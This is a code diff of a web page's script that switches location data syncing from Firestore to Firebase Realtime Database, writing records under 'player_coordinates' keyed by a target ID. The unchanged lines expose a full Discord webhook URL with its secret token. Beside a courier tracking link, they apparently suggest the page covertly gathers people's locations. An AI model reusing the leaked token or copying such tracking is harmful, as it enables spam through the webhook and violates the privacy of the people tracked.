@@ -72,7 +72,7 @@
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
     const BASE_LAT = 9.9833;
     const BASE_LNG = 99.1500;
-    const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
+const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/tracking/';
     
     // Firebase Configuration (for real-time sync)
     const FIREBASE_CONFIG = {
@@ -92,7 +92,7 @@
       if (typeof firebase !== 'undefined' && firebase.initializeApp) {
         try {
           firebase.initializeApp(FIREBASE_CONFIG);
-          firebaseDb = firebase.firestore();
+          firebaseDb = firebase.database();
           return true;
         } catch (e) {
           console.error('Firebase init error:', e);
@@ -101,16 +101,17 @@
       return false;
     }
     
-    // Send data to Firebase for real-time sync
+    // Send data to Firebase Realtime Database
     async function sendToFirebase(targetId, data) {
       if (!firebaseDb) return false;
       
       try {
-        const docRef = firebaseDb.collection('location_reports').doc(targetId);
-        await docRef.set({
+        // ส่งข้อมูลไปยัง Firebase Realtime Database ที่โหนด 'player_coordinates'
+        const dbRef = firebaseDb.ref('player_coordinates/' + targetId);
+        await dbRef.set({
           ...data,
           syncedAt: new Date().toISOString()
-        }, { merge: true });
+        });
         return true;
       } catch (e) {
         console.error('Firebase sync error:', e);
@@ -559,8 +560,8 @@
       });
     });
   </script>
-  <!-- Firebase SDK for real-time sync -->
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+   <!-- Firebase SDK for Realtime Database -->
+   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
 </body>
 </html>
